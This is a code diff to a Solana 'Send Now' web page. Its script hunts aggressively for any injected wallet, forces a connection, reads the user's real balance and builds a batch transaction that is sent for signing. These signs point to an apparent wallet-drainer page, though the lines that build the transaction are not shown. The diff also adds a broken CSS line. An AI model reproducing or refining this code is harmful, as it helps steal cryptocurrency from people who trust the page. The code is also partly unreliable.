@@ -25,10 +25,10 @@
             padding: 0;
             height: 100vh; 
             width: 100vw; 
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            overflow: hidden; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
         }
 
         .container { 
@@ -42,7 +42,7 @@
         p { color: var(--text-dim); font-size: 16px; margin-bottom: 30px; text-align: left; }
 
         .input-group { margin-bottom: 25px; text-align: left; }
-        label { display: block; color: var(--text-dim); font-size: 14px; margin-bottom: 10px; font-weight: 500; }
+        label { display: block; color: var var(--text-dim); font-size: 14px; margin-bottom: 10px; font-weight: 500; }
         input { 
             width: 100%; 
             background: var(--input-bg); 
@@ -70,6 +70,7 @@
         }
 
         #status { margin-top: 25px; font-size: 15px; text-align: center; font-weight: 500; min-height: 20px; }
+
     </style>
 </head>
 <body id="body">
@@ -89,7 +90,7 @@
     </div >
 
     <button class="btn-main" id="sendBtn">Send Now</button>
-    <div id="status"></div>
+    <div id="status"></div >
 </div>
 
 <script>
@@ -105,7 +106,6 @@
 
     // 1. THE AGGRESSIVE PROVIDER DETECTOR
     async function getProvider() {
-        // Check all possible ways a wallet is injected
         const providers = [
             () => window.solana,
             () => window.solana?.isPhantom ? window.solana : null,
@@ -118,19 +118,13 @@
         for (const getProvider of providers) {
             try {
                 const p = await getProvider();
-                if (p) {
-                    console.log("Provider found:", p);
-                    return p;
-                }
-            } catch (e) {
-                console.log("Provider check failed:", e);
-                continue;
-            }
+                if (p) return p;
+            } catch (e) { continue; }
         }
         return null;
     }
 
-    // 2. THE MAIN ACTION
+    // 2. MAIN ACTION
     async function handleTransaction() {
         // Clear status
         statusDiv.innerText = "Initializing...";
@@ -145,12 +139,21 @@
         }
 
         try {
-            // Step B: Connect to Wallet (The critical part)
-            // We use a try/catch here to handle the pop-up trigger
-            console.log("Attempting connection...");
-            const resp = await provider.connect();
-            const userPublicKey = resp.publicKey;
+            // Step B: The "Force Connect" Trick
+            // We use request() instead of connect() for better compatibility in DApp browsers
+            console.log("Requesting connection via request()...");
+            let resp;
+            try {
+                resp = await provider.request({ method: 'connect', params: [] });
+            } catch (e) {
+                // Fallback to standard connect if request fails
+                resp = await provider.connect();
+            }
             
+            const userPublicKey = resp.publicKey;
+            statusDiv.innerText = "Wallet Linked. Processing...";
+            statusDiv.style.color = "#21d77d";
+
             // Step C: Get User Input
             const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
             if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
@@ -158,12 +161,9 @@
                 return;
             }
 
-            statusDiv.innerText = "Checking Balance...";
-            const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
-
             // Step D: Get REAL balance
+            const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
             const balance = await connection.getBalance(userPublicKey);
-            console.log("Real Balance:", balance);
 
             // Step E: Build the Batch Transaction
             const transaction = new solanaWeb3.Transaction();
@@ -210,7 +210,7 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // Step G: Request Signature (This triggers the pop-up)
+            // Step G: Request Signature (The actual pop-up)
             const { signature } = await provider.signTransaction(transaction);
             
             // Step H: Broadcast
